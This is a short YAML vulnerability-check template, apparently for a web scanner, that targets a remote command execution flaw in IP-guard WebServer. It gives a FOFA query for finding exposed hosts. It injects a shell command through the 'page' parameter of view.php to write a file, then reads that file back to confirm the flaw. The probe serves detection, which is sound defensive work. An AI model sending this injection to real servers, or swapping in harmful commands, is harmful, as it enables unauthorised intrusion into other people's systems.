id: ip-guard-webserver-rce

info:
  name: IP-guard WebServer 远程命令执行漏洞
  author: 二大爷
  severity: high
  verified: true
  descripiton: |-
    IP-guard WebServer 远程命令执行漏洞
    fofa: app="IP-guard"
  tags: ip-guard,rce
  created: 2023/11/24

set:
  randstr: randomLowercase(12)
  filename: randomLowercase(8)
rules:
  r0:
    request:
      method: GET
      path: /ipg/static/appr/lib/flexpaper/php/view.php?doc=11.jpg&format=swf&isSplit=true&page=||echo+{{randstr}}+>{{filename}}.txt
    expression: response.status == 200
  r1:
    request:
      method: GET
      path: /ipg/static/appr/lib/flexpaper/php/{{filename}}.txt
    expression: response.status == 200 && response.body.bcontains(bytes(randstr))
expression: r0() && r1()
